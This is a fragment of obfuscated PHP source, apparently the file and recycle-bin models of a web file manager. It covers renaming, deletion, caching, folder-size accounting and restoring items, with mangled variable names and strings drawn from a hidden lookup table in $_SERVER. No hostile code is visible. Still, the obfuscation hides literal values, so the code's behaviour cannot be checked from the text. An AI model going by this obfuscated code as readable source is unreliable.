$†¶‡Ê’š ? $†¶‡Ê’š : array(); $èøê¥—› = $èøê¥—› ? $èøê¥—› : array(); $†¶‡Ê’š = array_unique(array_filter($†¶‡Ê’š)); $èøê¥—› = array_unique(array_filter($èøê¥—›)); if (!$†¶‡Ê’š) { return !1; } $¨¹ïñ¶ö = array($ôÑ£µ´[493] => array($ôÑ£µ´[494], $†¶‡Ê’š)); Model($ôÑ£µ´[2291])->where($¨¹ïñ¶ö)->delete(); Model($ôÑ£µ´[537])->where($¨¹ïñ¶ö)->delete(); Model($ôÑ£µ´[2131])->where($¨¹ïñ¶ö)->delete(); Model($ôÑ£µ´[638])->where($¨¹ïñ¶ö)->delete(); Model($ôÑ£µ´[1957])->removeBySource($†¶‡Ê’š); Model($ôÑ£µ´[2272])->removeBySource($†¶‡Ê’š); $this->where($¨¹ïñ¶ö)->delete(); Model($ôÑ£µ´[546])->remove($èøê¥—›); for ($ºæà¹¨ê = 0; $ºæà¹¨ê < count($†¶‡Ê’š); $ºæà¹¨ê++) { $this->sourceCacheClear($†¶‡Ê’š[$ºæà¹¨ê]); } } public function rename($¹§¼—±, $óÊØ‹Óš) { $Æê®ƒö‘ =& $_SERVER[ÔÕ±ĞšÎ]; $ïáÆ¤ı  = $this->sourceInfo($¹§¼—±); if (!$ïáÆ¤ı ) { return !1; } $ìÃ¶¸“ = $this->fileNameExist($ïáÆ¤ı [$Æê®ƒö‘[192]], $óÊØ‹Óš); if ($ìÃ¶¸“ && $ìÃ¶¸“ != $¹§¼—±) { return !1; } $—ÎÆ¥³“ = array($Æê®ƒö‘[496] => $óÊØ‹Óš, $Æê®ƒö‘[656] => USER_ID); if ($ïáÆ¤ı [$Æê®ƒö‘[487]] != $Æê®ƒö‘[91]) { $—ÎÆ¥³“[$Æê®ƒö‘[488]] = substr(get_path_ext($óÊØ‹Óš), 0, 10); } Model($Æê®ƒö‘[638])->eventRename($¹§¼—±, $ïáÆ¤ı [$Æê®ƒö‘[32]], $óÊØ‹Óš); $this->sourceCacheClear($¹§¼—±); $this->setNamePinyin($¹§¼—±, $—ÎÆ¥³“[$Æê®ƒö‘[32]], !1); $this->updateModifyTime($ïáÆ¤ı [$Æê®ƒö‘[192]]); $““¨·¨ = $this->where(array($Æê®ƒö‘[493] => $¹§¼—±))->data($—ÎÆ¥³“)->save(); $ ë”Ë  = $Æê®ƒö‘[2280] . $ïáÆ¤ı [$Æê®ƒö‘[192]]; if (isset(self::$cacheChildList[$ ë”Ë ])) { unset(self::$cacheChildList[$ ë”Ë ]); } return $““¨·¨; } public function setNamePinyin($ıŞ¸ú·¨, $¥¹—¥ë¡, $ê×™¡€¥ = true) { $×şö¾ß =& $_SERVER[ÔÕ±ĞšÎ]; $·›œïÂÜ = Input::check($¥¹—¥ë¡, $×şö¾ß[660]); $ †ê±½à = array($×şö¾ß[519] => KodSort::makeStr($¥¹—¥ë¡)); if ($·›œïÂÜ) { $ †ê±½à[$×şö¾ß[540]] = str_replace($×şö¾ß[53], $×şö¾ß[12], Pinyin::get($¥¹—¥ë¡)); $ †ê±½à[$×şö¾ß[539]] = Pinyin::get($¥¹—¥ë¡, $×şö¾ß[661]); } if (!$ê×™¡€¥ && !$·›œïÂÜ) { $ †ê±½à[$×şö¾ß[540]] = null; $ †ê±½à[$×şö¾ß[539]] = null; } $this->metaSet($ıŞ¸ú·¨, $ †ê±½à); } public function getContent($ÙÆ˜û±·) { $‡õÚ‘×Ã =& $_SERVER[ÔÕ±ĞšÎ]; $Ô³è’ù® = $this->fileInfoGet($ÙÆ˜û±·); if (!$Ô³è’ù®) { return !1; } if ($Ô³è’ù®[$‡õÚ‘×Ã[79]] == 0) { return $‡õÚ‘×Ã[12]; } $Ü¢…¨‘Ø = $‡õÚ‘×Ã[2294] . $Ô³è’ù®[$‡õÚ‘×Ã[549]]; if ($Ô³è’ù®[$‡õÚ‘×Ã[79]] <= 1024 * 10) { $ˆìöÌ©† = Cache::get($Ü¢…¨‘Ø); if (!$ˆìöÌ©†) { $ˆìöÌ©† = IO::getContent($Ô³è’ù®[$‡õÚ‘×Ã[87]]); Cache::set($Ü¢…¨‘Ø, $ˆìöÌ©†); } return $ˆìöÌ©†; } if (!$Ô³è’ù®[$‡õÚ‘×Ã[87]]) { return $‡õÚ‘×Ã[12]; } return IO::getContent($Ô³è’ù®[$‡õÚ‘×Ã[87]]); } public function setDesc($åçğæê˜, $•¤«­®Ô) { $ïáùŞ– =& $_SERVER[ÔÕ±ĞšÎ]; Model($ïáùŞ–[638])->eventAddDesc($åçğæê˜, $•¤«­®Ô); return $this->metaSet($åçğæê˜, $ïáùŞ–[528], $•¤«­®Ô); } public function setContent($Ôá«‰ª, $ßÂ²Ù¥µ = '') { $ŞÛÔ…¬˜ =& $_SERVER[ÔÕ±ĞšÎ]; $¡…””âê = $this->sourceInfo($Ôá«‰ª); $Ë¦ûæÙ = $this->fileInfoGet($Ôá«‰ª); if (!$Ë¦ûæÙ || !$¡…””âê) { return !1; } $ÍåˆğÊ‰ = Model($ŞÛÔ…¬˜[546])->addFileByContent($ßÂ²Ù¥µ, $¡…””âê[$ŞÛÔ…¬˜[32]]); $Âœì‰ë† = $this->fileHistory($¡…””âê, $ÍåˆğÊ‰[$ŞÛÔ…¬˜[543]], $ÍåˆğÊ‰[$ŞÛÔ…¬˜[79]]); if (!$Âœì‰ë†) { return Model($ŞÛÔ…¬˜[546])->remove($ÍåˆğÊ‰[$ŞÛÔ…¬˜[543]]); } $this->folderSizeReset($¡…””âê[$ŞÛÔ…¬˜[192]]); return !0; } public function fileSubstr($Ù€”ùÊ“, $–•†Îßë, $¯±çÒ‚Â) { $€¸ã£×¥ = $this->fileInfoGet($Ù€”ùÊ“); if (!$€¸ã£×¥) { return !1; } return IO::fileSubstr($€¸ã£×¥[$_SERVER[ÔÕ±ĞšÎ][87]], $–•†Îßë, $¯±çÒ‚Â); } public function fileInfoGet($ö³Åƒˆı) { $Äú¯Å¹½ =& $_SERVER[ÔÕ±ĞšÎ]; $¦àˆìÉ = $this->sourceInfo($ö³Åƒˆı); if (!$¦àˆìÉ || $¦àˆìÉ[$Äú¯Å¹½[487]]) { return !1; } $µ¢şÊ…³ = $Äú¯Å¹½[550] . $¦àˆìÉ[$Äú¯Å¹½[543]]; $Í¬†’–× = _get(self::$cacheFileInfo, $µ¢şÊ…³); if ($Í¬†’–×) { return $Í¬†’–×; } $ø£…§Øí = Model($Äú¯Å¹½[546])->fileInfo($¦àˆìÉ[$Äú¯Å¹½[543]]); if ($ø£…§Øí) { $ø£…§Øí[$Äú¯Å¹½[32]] = $¦àˆìÉ[$Äú¯Å¹½[32]]; } self::$cacheFileInfo[$µ¢şÊ…³] = $ø£…§Øí; return $ø£…§Øí; } private function folderChildrenNumber($Ì†ÑŒ§) { $•™”ïìÏ =& $_SERVER[ÔÕ±ĞšÎ]; $Ñá€ªñ = $this->sourceInfo($Ì†ÑŒ§); $Üæ†“ = array($•™”ïìÏ[657] => array($•™”ïìÏ[617], $Ñá€ªñ[$•™”ïìÏ[586]] . $Ì†ÑŒ§ . $•™”ïìÏ[618]), $•™”ïìÏ[654] => $Ñá€ªñ[$•™”ïìÏ[571]], $•™”ïìÏ[506] => intval($Ñá€ªñ[$•™”ïìÏ[507]]), $•™”ïìÏ[651] => 1); $¶Ï›€´Š = $this->where($Üæ†“)->count(); $”íÈ–Ñ = $this->where($Üæ†“)->where(array($•™”ïìÏ[651] => 0))->count(); return array($•™”ïìÏ[83] => $”íÈ–Ñ, $•™”ïìÏ[84] => $¶Ï›€´Š); } public function pathInfo($ËœÁ‘›, $óŒ‘¡ì¥ = false) { $Ì«˜äÅ =& $_SERVER[ÔÕ±ĞšÎ]; $óŒ‘¡ì¥ = !1; $ËœÁ‘› = intval($ËœÁ‘›); $•”¿Ø—è = $Ì«˜äÅ[536] . intval($óŒ‘¡ì¥) . $Ì«˜äÅ[464] . $ËœÁ‘›; $à‰  ÑŠ = _get(self::$cachePathInfo, $•”¿Ø—è); if ($à‰  ÑŠ) { return $à‰  ÑŠ; } $Øâã‡®³ = $this->sourceInfo($ËœÁ‘›); if (!$Øâã‡®³) { return !1; } $Øâã‡®³ = $this->_listDataApplyItem($Øâã‡®³, $óŒ‘¡ì¥); self::$cachePathInfo[$•”¿Ø—è] = $Øâã‡®³; return $Øâã‡®³; } public static $cachePathInfoMore = array(); public function pathInfoMore($±§á‡‰ä) { $¤°±¡—€ =& $_SERVER[ÔÕ±ĞšÎ]; $İèî‘‡ = _get(self::$cachePathInfoMore, $±§á‡‰ä); if ($İèî‘‡) { return $İèî‘‡; } $Ğ Øè× = $this->pathInfo($±§á‡‰ä); if (!$Ğ Øè×) { return !1; } if ($Ğ Øè×[$¤°±¡—€[487]] == $¤°±¡—€[91]) { $Ğ Øè×[$¤°±¡—€[82]] = $this->folderChildrenNumber($±§á‡‰ä); } self::$cachePathInfoMore[$±§á‡‰ä] = $Ğ Øè×; return $Ğ Øè×; } public function sourceInfo($¯ËğûèÅ) { $½—¢Œİ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¯ËğûèÅ) { return array(); } $¯ËğûèÅ = intval($¯ËğûèÅ); $ª³–šğ = $½—¢Œİ[535] . $¯ËğûèÅ; $£É¾Å°× = _get(self::$cacheSourceInfo, $ª³–šğ); if ($£É¾Å°×) { return $£É¾Å°×; } $áŸ‘Ÿé» = $this->where(array($½—¢Œİ[193] => $¯ËğûèÅ))->find(); self::$cacheSourceInfo[$ª³–šğ] = $áŸ‘Ÿé»; return self::$cacheSourceInfo[$ª³–šğ]; } public function sourceCacheClear($§­ø«ßò = false) { self::cacheClear($§­ø«ßò); } public static function cacheClear($”ñççÊ = false) { $ÌˆÀŠ‹± =& $_SERVER[ÔÕ±ĞšÎ]; if ($”ñççÊ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÌˆÀŠ‹±[535] . $”ñççÊ]); unset(self::$cachePathInfoMore[$”ñççÊ]); unset(self::$cachePathInfo[$ÌˆÀŠ‹±[2295] . $”ñççÊ]); unset(self::$cachePathInfo[$ÌˆÀŠ‹±[2296] . $”ñççÊ]); } public function metaSet($ù­æÇ”, $Å¯·£ô = null, $¦ÇÖúŒ = null) { $øô ÚÑ™ = parent::metaSet($ù­æÇ”, $Å¯·£ô, $¦ÇÖúŒ); if ($øô ÚÑ™) { $this->sourceCacheClear($ù­æÇ”); } return $øô ÚÑ™; } public function pathInfoByPath($óÓ¹­ìÑ, $ øÊÅ) { $…Œô¨ŸÔ =& $_SERVER[ÔÕ±ĞšÎ]; $ôáÅñäò = !$ øÊÅ ? array() : explode($…Œô¨ŸÔ[8], trim($ øÊÅ, $…Œô¨ŸÔ[8])); $„†±Ñá = $óÓ¹­ìÑ; foreach ($ôáÅñäò as $“êŸí“‘) { $©¦—Ó™¢ = array($…Œô¨ŸÔ[192] => $„†±Ñá, $…Œô¨ŸÔ[32] => $“êŸí“‘); $®éÏşõ = $this->field($…Œô¨ŸÔ[2297])->where($©¦—Ó™¢)->select(); if (!$®éÏşõ) { return !1; } $®éÏşõ = array_sort_by($®éÏşõ, $…Œô¨ŸÔ[507]); $„†±Ñá = $®éÏşõ[0][$…Œô¨ŸÔ[193]]; } $ÏÈİÅşï = $this->sourceInfo($„†±Ñá); $this->pathInfoFilter($ÏÈİÅşï); return $ÏÈİÅşï; } protected function updateModifyTime($ºÌ¦œş¨) { $ÅÌı¸ =& $_SERVER[ÔÕ±ĞšÎ]; $¯ò¦Šœ = defined($ÅÌı¸[2206]) ? USER_ID : 0; if (!$ºÌ¦œş¨) { return; } if (!is_array($ºÌ¦œş¨)) { $ºÌ¦œş¨ = array($ºÌ¦œş¨); } foreach ($ºÌ¦œş¨ as $•¾ôèŸ¼ => $Î¾³Ú) { $ºÌ¦œş¨[$•¾ôèŸ¼] = intval($Î¾³Ú); $this->sourceCacheClear($Î¾³Ú); } $”í¡óÅ = array($ÅÌı¸[193] => array($ÅÌı¸[7], $ºÌ¦œş¨)); $ÏÛÄ”§÷ = array($ÅÌı¸[656] => $¯ò¦Šœ, $ÅÌı¸[500] => time()); $this->where($”í¡óÅ)->save($ÏÛÄ”§÷); } public function folderSizeReset($××•šú„, $ğÆğÀ€Í = false) { $ÄäúÌ™Ç =& $_SERVER[ÔÕ±ĞšÎ]; if ($this->statusIgnoreResetSpace) { return; } $±÷¼ë = $this->sourceInfo($××•šú„); $Šìæí¾î = $ÄäúÌ™Ç[2298] . $××•šú„; CacheLock::lock($Šìæí¾î, 20); if ($ğÆğÀ€Í === !1) { $this->sourceCacheClear($××•šú„); $±÷¼ë = $this->sourceInfo($××•šú„); $¿±µÛ‹ê = array($ÄäúÌ™Ç[479] => $××•šú„, $ÄäúÌ™Ç[506] => 0); $Ü¡¯ˆŸì = $this->where($¿±µÛ‹ê)->sum($ÄäúÌ™Ç[79]); $ğÆğÀ€Í = intval($Ü¡¯ˆŸì) - intval($±÷¼ë[$ÄäúÌ™Ç[79]]); } if ($ğÆğÀ€Í == 0) { return CacheLock::unlock($Šìæí¾î); } $¨—Â £° = $this->parentLevelArray($±÷¼ë[$ÄäúÌ™Ç[586]]); if (!$¨—Â £°) { $¨—Â £° = array(); } $¨—Â £°[] = $±÷¼ë[$ÄäúÌ™Ç[193]]; $¿±µÛ‹ê = array($ÄäúÌ™Ç[193] => array($ÄäúÌ™Ç[494], $¨—Â £°)); if ($ğÆğÀ€Í < 0) { $¿±µÛ‹ê[$ÄäúÌ™Ç[79]] = array($ÄäúÌ™Ç[1094], abs($ğÆğÀ€Í)); } $this->where($¿±µÛ‹ê)->setAdd($ÄäúÌ™Ç[79], $ğÆğÀ€Í); CacheLock::unlock($Šìæí¾î); $¦Ê„öÅŠ = $ÄäúÌ™Ç[2299] . $±÷¼ë[$ÄäúÌ™Ç[190]] . $ÄäúÌ™Ç[4] . $±÷¼ë[$ÄäúÌ™Ç[571]]; $˜»îëá” = array($±÷¼ë[$ÄäúÌ™Ç[190]], $±÷¼ë[$ÄäúÌ™Ç[571]]); TaskRun::timeLimitCall($¦Ê„öÅŠ, $ÄäúÌ™Ç[2300], $˜»îëá”, 1.5); } public function folderSizeResetChildren($àÙßîˆÊ) { $ƒ‹ŠÂÖ– =& $_SERVER[ÔÕ±ĞšÎ]; $this->sourceCacheClear($àÙßîˆÊ); $ÉêàÒœš = $this->sourceInfo($àÙßîˆÊ); $ä¨æ±ŠÄ = array($ƒ‹ŠÂÖ–[651] => 1, $ƒ‹ŠÂÖ–[654] => $ÉêàÒœš[$ƒ‹ŠÂÖ–[571]], $ƒ‹ŠÂÖ–[657] => array($ƒ‹ŠÂÖ–[617], $ÉêàÒœš[$ƒ‹ŠÂÖ–[586]] . $àÙßîˆÊ . $ƒ‹ŠÂÖ–[618])); $™¬ƒë  = $ƒ‹ŠÂÖ–[2301]; $®éŞÕ’Š = $this->field($™¬ƒë )->where($ä¨æ±ŠÄ)->select(); $ä¨æ±ŠÄ[$ƒ‹ŠÂÖ–[487]] = 0; $ç¤‹Û = $this->field($™¬ƒë )->where($ä¨æ±ŠÄ)->select(); if (!$ç¤‹Û) { return; } $®éŞÕ’Š[] = $ÉêàÒœš; $®éŞÕ’Š = array_to_keyvalue($®éŞÕ’Š, $ƒ‹ŠÂÖ–[193]); foreach ($®éŞÕ’Š as $Êä‚ù => $³Ÿë—¡İ) { $®éŞÕ’Š[$Êä‚ù][$ƒ‹ŠÂÖ–[2302]] = $®éŞÕ’Š[$Êä‚ù][$ƒ‹ŠÂÖ–[79]]; $®éŞÕ’Š[$Êä‚ù][$ƒ‹ŠÂÖ–[79]] = 0; } foreach ($ç¤‹Û as $³Ÿë—¡İ) { $ÖÙ¬ˆÄÅ = $³Ÿë—¡İ[$ƒ‹ŠÂÖ–[192]] . $ƒ‹ŠÂÖ–[12]; if (!isset($®éŞÕ’Š[$ÖÙ¬ˆÄÅ])) { continue; } if ($³Ÿë—¡İ[$ƒ‹ŠÂÖ–[507]] == $®éŞÕ’Š[$ÖÙ¬ˆÄÅ][$ƒ‹ŠÂÖ–[507]]) { $®éŞÕ’Š[$ÖÙ¬ˆÄÅ][$ƒ‹ŠÂÖ–[79]] += $³Ÿë—¡İ[$ƒ‹ŠÂÖ–[79]]; } } foreach ($®éŞÕ’Š as $³Ÿë—¡İ) { $¥‹ô·Ñ = $this->parentLevelArray($³Ÿë—¡İ[$ƒ‹ŠÂÖ–[586]]); foreach ($¥‹ô·Ñ as $ÖÙ¬ˆÄÅ) { $ÖÙ¬ˆÄÅ = $ÖÙ¬ˆÄÅ . $ƒ‹ŠÂÖ–[12]; if (!isset($®éŞÕ’Š[$ÖÙ¬ˆÄÅ])) { continue; } if ($³Ÿë—¡İ[$ƒ‹ŠÂÖ–[507]] == $®éŞÕ’Š[$ÖÙ¬ˆÄÅ][$ƒ‹ŠÂÖ–[507]]) { $®éŞÕ’Š[$ÖÙ¬ˆÄÅ][$ƒ‹ŠÂÖ–[79]] += $³Ÿë—¡İ[$ƒ‹ŠÂÖ–[79]]; } } } $˜µÒçù° = array(); foreach ($®éŞÕ’Š as $³Ÿë—¡İ) { if ($³Ÿë—¡İ[$ƒ‹ŠÂÖ–[79]] == $³Ÿë—¡İ[$ƒ‹ŠÂÖ–[2302]]) { continue; } $˜µÒçù°[] = array($ƒ‹ŠÂÖ–[193], $³Ÿë—¡İ[$ƒ‹ŠÂÖ–[193]], $ƒ‹ŠÂÖ–[79], $³Ÿë—¡İ[$ƒ‹ŠÂÖ–[79]]); } $this->saveAll($˜µÒçù°); } public function userSpaceReset($ä¤çµ” = false) { $Ñ¸ˆÅóê =& $_SERVER[ÔÕ±ĞšÎ]; $ø§Îİı = $this->where(array($Ñ¸ˆÅóê[190] => self::TYPE_USER, $Ñ¸ˆÅóê[571] => $ä¤çµ”, $Ñ¸ˆÅóê[487] => 0))->sum($Ñ¸ˆÅóê[79]); $ø§Îİı = !$ø§Îİı || $ø§Îİı <= 0 ? 0 : $ø§Îİı; Model($Ñ¸ˆÅóê[579])->userEdit($ä¤çµ”, array($Ñ¸ˆÅóê[1966] => $ø§Îİı)); } public function targetSpaceUpdate($×•ò‹İÔ, $è¾”µ¥) { $²®°¹¸ú =& $_SERVER[ÔÕ±ĞšÎ]; if (!$è¾”µ¥) { return; } if (!in_array($×•ò‹İÔ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ä³×õÚÇ = $this->targetSpaceSize($×•ò‹İÔ, $è¾”µ¥); if ($×•ò‹İÔ == self::TYPE_USER) { Model($²®°¹¸ú[579])->userEdit($è¾”µ¥, array($²®°¹¸ú[1966] => $Ä³×õÚÇ)); } else { if ($×•ò‹İÔ == self::TYPE_GROUP) { Model($²®°¹¸ú[587])->groupEdit($è¾”µ¥, array($²®°¹¸ú[1966] => $Ä³×õÚÇ)); } } } public function targetSpaceSize($ËøóßÃœ, $Ğ›œº™) { $á‘ß—ï =& $_SERVER[ÔÕ±ĞšÎ]; $Âş¼½Ô½ = 0; $˜ÒÇˆÕù = $this->targetSourceRoot($ËøóßÃœ, $Ğ›œº™, !0); foreach ($˜ÒÇˆÕù as $ÈØÑÔûé) { if (!$ÈØÑÔûé) { continue; } $Âş¼½Ô½ += floatval($ÈØÑÔûé[$á‘ß—ï[79]]); $ºµÄ¿ªâ = array($á‘ß—ï[657] => array($á‘ß—ï[617], $á‘ß—ï[595] . $ÈØÑÔûé[$á‘ß—ï[193]] . $á‘ß—ï[618])); $ƒñÓˆÅÕ = Model($á‘ß—ï[505])->field($á‘ß—ï[493])->where($ºµÄ¿ªâ)->select(); $ƒñÓˆÅÕ = array_to_keyvalue($ƒñÓˆÅÕ, $á‘ß—ï[12], $á‘ß—ï[193]); $ƒñÓˆÅÕ = array_unique(array_filter($ƒñÓˆÅÕ)); if ($ƒñÓˆÅÕ) { $ºµÄ¿ªâ = array($á‘ß—ï[493] => array($á‘ß—ï[494], $ƒñÓˆÅÕ)); $Âş¼½Ô½ += floatval($this->where($ºµÄ¿ªâ)->sum($á‘ß—ï[79])); } } $Âş¼½Ô½ = !$Âş¼½Ô½ || $Âş¼½Ô½ <= 0 ? 0 : $Âş¼½Ô½; return $Âş¼½Ô½; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($’ğŠ¡µë) { return $this->fileTypeProfile($’ğŠ¡µë, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Á­Ä”) { return $this->fileTypeProfile($Á­Ä”, SourceModel::TYPE_GROUP); } private function fileTypeProfile($îÓÎş†, $Ø¹°¨ö¸) { $ñÀé†Ò =& $_SERVER[ÔÕ±ĞšÎ]; $ù­ì”Š = $ñÀé†Ò[2303] . $îÓÎş† . $ñÀé†Ò[11] . $Ø¹°¨ö¸; $¦¹ôòì = Cache::get($ù­ì”Š); if ($¦¹ôòì) { return $¦¹ôòì; } $‘÷Ã‘¯² = array($ñÀé†Ò[651] => 0); if ($îÓÎş† != !1) { $‘÷Ã‘¯²[$ñÀé†Ò[571]] = $îÓÎş†; $‘÷Ã‘¯²[$ñÀé†Ò[190]] = $Ø¹°¨ö¸; } $÷øãÆ«› = array(); $÷øãÆ«›[$ñÀé†Ò[2304]] = array($ñÀé†Ò[2305] => LNG($ñÀé†Ò[2304]), $ñÀé†Ò[2306] => $this->where($‘÷Ã‘¯²)->count(), $ñÀé†Ò[622] => $this->where($‘÷Ã‘¯²)->sum($ñÀé†Ò[79])); $…ûÀú¡ú = KodIO::fileTypeList(); foreach ($…ûÀú¡ú as $â®›àæ— => $®´Ğ³¢¶) { $‘÷Ã‘¯²[$ñÀé†Ò[488]] = $this->fileTypeWhere($â®›àæ—); $÷øãÆ«›[$â®›àæ—] = array($ñÀé†Ò[2305] => $®´Ğ³¢¶[$ñÀé†Ò[32]], $ñÀé†Ò[2306] => $this->where($‘÷Ã‘¯²)->count(), $ñÀé†Ò[622] => $this->where($‘÷Ã‘¯²)->sum($ñÀé†Ò[79])); } Cache::set($ù­ì”Š, $÷øãÆ«›, 1200); return $÷øãÆ«›; } public function fileNameExist($—ò«”úÅ, $œ¤›¥¥’) { $å¾ÎğµÂ =& $_SERVER[ÔÕ±ĞšÎ]; $ûìª½ó‹ = $this->field($å¾ÎğµÂ[2307])->where(array($å¾ÎğµÂ[192] => $—ò«”úÅ, $å¾ÎğµÂ[32] => $œ¤›¥¥’, $å¾ÎğµÂ[507] => 0))->find(); return is_array($ûìª½ó‹) ? $ûìª½ó‹[$å¾ÎğµÂ[193]] : !1; } public function childList($Ò›üˆı¨) { $£¼ªı¦ë =& $_SERVER[ÔÕ±ĞšÎ]; $µÔÉğ›Æ = $£¼ªı¦ë[2280] . $Ò›üˆı¨; if (isset(self::$cacheChildList[$µÔÉğ›Æ])) { return self::$cacheChildList[$µÔÉğ›Æ]; } $‡˜½‡œê = array($£¼ªı¦ë[192] => intval($Ò›üˆı¨), $£¼ªı¦ë[507] => 0); $å£÷”ô¯ = $this->where($‡˜½‡œê)->select(); $å£÷”ô¯ = $å£÷”ô¯ ? $å£÷”ô¯ : array(); self::$cacheChildList[$µÔÉğ›Æ] = $å£÷”ô¯; foreach ($å£÷”ô¯ as $¹Š—˜éË) { $µÔÉğ›Æ = $£¼ªı¦ë[535] . $¹Š—˜éË[$£¼ªı¦ë[193]]; self::$cacheSourceInfo[$µÔÉğ›Æ] = $¹Š—˜éË; } return $å£÷”ô¯; } public function fileNameAuto($î•Œäß, $˜ ´ŠÆš, $ç…¬¼º = REPEAT_RENAME, $ê£³Úé = false) { $Ğéğ«¾¸ =& $_SERVER[ÔÕ±ĞšÎ]; $ÅÁñíÃû = get_path_ext($˜ ´ŠÆš); $‹»íÊô = $ÅÁñíÃû ? get_path_ext_name($˜ ´ŠÆš) . $Ğéğ«¾¸[2308] . $ÅÁñíÃû : $˜ ´ŠÆš . $Ğéğ«¾¸[462]; $«æ×èÍ¥ = array($Ğéğ«¾¸[192] => $î•Œäß, $Ğéğ«¾¸[507] => 0, $Ğéğ«¾¸[32] => array($Ğéğ«¾¸[461], $‹»íÊô)); $¥•ŠŞ = $this->field($Ğéğ«¾¸[32])->where($«æ×èÍ¥)->select(); $Ìõšáõ’ = array_to_keyvalue($¥•ŠŞ, $Ğéğ«¾¸[12], $Ğéğ«¾¸[32]); return $this->fileNameAutoGet($Ìõšáõ’, $˜ ´ŠÆš, $ç…¬¼º, $ê£³Úé); } public function fileNameAutoGet($†µòòóí, $‚·™—¤İ, $â•±Ãåä, $ğì÷×İ) { $á¤™©Û =& $_SERVER[ÔÕ±ĞšÎ]; if ($â•±Ãåä == REPEAT_REPLACE || !$†µòòóí || !in_array_not_case($‚·™—¤İ, $†µòòóí) || $ğì÷×İ && $â•±Ãåä != REPEAT_RENAME_FOLDER) { return $‚·™—¤İ; } if ($â•±Ãåä == REPEAT_SKIP) { return !1; } $â¦Ÿ = $á¤™©Û[10] . get_path_ext($‚·™—¤İ); $â¦Ÿ = $â¦Ÿ == $á¤™©Û[10] || $ğì÷×İ ? $á¤™©Û[12] : $â¦Ÿ; for ($Ÿ„¿çÚç = 1; $Ÿ„¿çÚç <= count($†µòòóí) + 1; $Ÿ„¿çÚç++) { $ƒ‰²­È÷ = substr($‚·™—¤İ, 0, strlen($‚·™—¤İ) - strlen($â¦Ÿ)); $ñÛî´Ü = $ƒ‰²­È÷ . "\x28{$Ÿ„¿çÚç}\51{$â¦Ÿ}"; if (!in_array_not_case($ñÛî´Ü, $†µòòóí)) { return $ñÛî´Ü; } } } } goto dÉÉ¡„¸Éƒ; dÉÉ¡„¸Éƒ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\x72\143\x65\x5f\x72\x65\143\171\143\154\145"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\x54\151\155\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\x75\156\143\164\151\x6f\x6e")); public function listData($Ğ¼öé = false) { $ó—ÙÉêï =& $_SERVER[ÔÕ±ĞšÎ]; $Ğ¼öé = $Ğ¼öé ? $Ğ¼öé : USER_ID; $û°ÄÜÛÄ = $this->where(array($ó—ÙÉêï[1768] => $Ğ¼öé))->select(); return array_to_keyvalue($û°ÄÜÛÄ, $ó—ÙÉêï[12], $ó—ÙÉêï[193]); } public function moveToRecycle($«ïşœÓé) { $–‚ò›» =& $_SERVER[ÔÕ±ĞšÎ]; $Òåî»ÍÌ = Model($–‚ò›»[1423]); $ß¤ò±ò› = $Òåî»ÍÌ->sourceInfo($«ïşœÓé); if (!$ß¤ò±ò› || $ß¤ò±ò›[$–‚ò›»[507]] == $–‚ò›»[91]) { return; } $“Œû®Â· = array($–‚ò›»[493] => $«ïşœÓé, $–‚ò›»[1768] => USER_ID, $–‚ò›»[653] => $ß¤ò±ò›[$–‚ò›»[190]], $–‚ò›»[654] => $ß¤ò±ò›[$–‚ò›»[571]], $–‚ò›»[657] => $ß¤ò±ò›[$–‚ò›»[586]]); $this->add($“Œû®Â·); $this->recycleMove($«ïşœÓé, 1); if ($ß¤ò±ò›[$–‚ò›»[487]] == $–‚ò›»[91]) { $¼‘Ö£Ÿµ = array($–‚ò›»[657] => array($–‚ò›»[617], $ß¤ò±ò›[$–‚ò›»[586]] . $«ïşœÓé . $–‚ò›»[618])); $Òåî»ÍÌ->where($¼‘Ö£Ÿµ)->setField($–‚ò›»[507], 1); } } public function clear() { $this->remove(!1); } public function remove($Æá¨ùêã = false, $Æ³Ëì¯´ = false) { $ÂÃ‘äÚé =& $_SERVER[ÔÕ±ĞšÎ]; $Æ³Ëì¯´ = $Æ³Ëì¯´ ? $Æ³Ëì¯´ : USER_ID; $‚ÑÀªÉá = Model($ÂÃ‘äÚé[1423]); $´¶³†Õà = $this->listData($Æ³Ëì¯´); $Æá¨ùêã = $Æá¨ùêã === !1 ? !1 : $Æá¨ùêã; $ÉŒÔ²ä = array(); foreach ($´¶³†Õà as $Ø¦õ¥„Ö) { if ($Æá¨ùêã != !1 && !in_array($Ø¦õ¥„Ö, $Æá¨ùêã)) { continue; } $î‰¬ø™ = $‚ÑÀªÉá->sourceInfo($Ø¦õ¥„Ö); $‚ÑÀªÉá->remove($Ø¦õ¥„Ö, !1); $…Ò÷ÎÉ¤ = $î‰¬ø™[$ÂÃ‘äÚé[190]] . $ÂÃ‘äÚé[11] . $î‰¬ø™[$ÂÃ‘äÚé[571]]; $ÉŒÔ²ä[$…Ò÷ÎÉ¤] = array($ÂÃ‘äÚé[653] => $î‰¬ø™[$ÂÃ‘äÚé[190]], $ÂÃ‘äÚé[571] => $î‰¬ø™[$ÂÃ‘äÚé[571]]); $this->where(array($ÂÃ‘äÚé[193] => $Ø¦õ¥„Ö))->delete(); } foreach ($ÉŒÔ²ä as $«€›ìÂ) { $‚ÑÀªÉá->targetSpaceUpdate($«€›ìÂ[$ÂÃ‘äÚé[190]], $«€›ìÂ[$ÂÃ‘äÚé[571]]); } } public function restore($ˆ‚Åı§— = false) { $Å½ôÜ£ = $this->listData(); $this->_restoreSource($Å½ôÜ£, $ˆ‚Åı§—); } public function removeUserAll($Á–¢ß€) { $this->remove(!1, $Á–¢ß€); } public function restoreItem($’ĞÎòƒæ) { $this->_restoreSource(array($’ĞÎòƒæ), array($’ĞÎòƒæ)); } private function _restoreSource($æÛ¾¸½ä, $®…½ı°â) { $³ÌÀŒ¨ï =& $_SERVER[ÔÕ±ĞšÎ]; $»™¡•ã = Model($³ÌÀŒ¨ï[1423]); $®…½ı°â = $®…½ı°â == !1 ? !1 : $®…½ı°â; if (!$æÛ¾¸½ä) { return !0; } 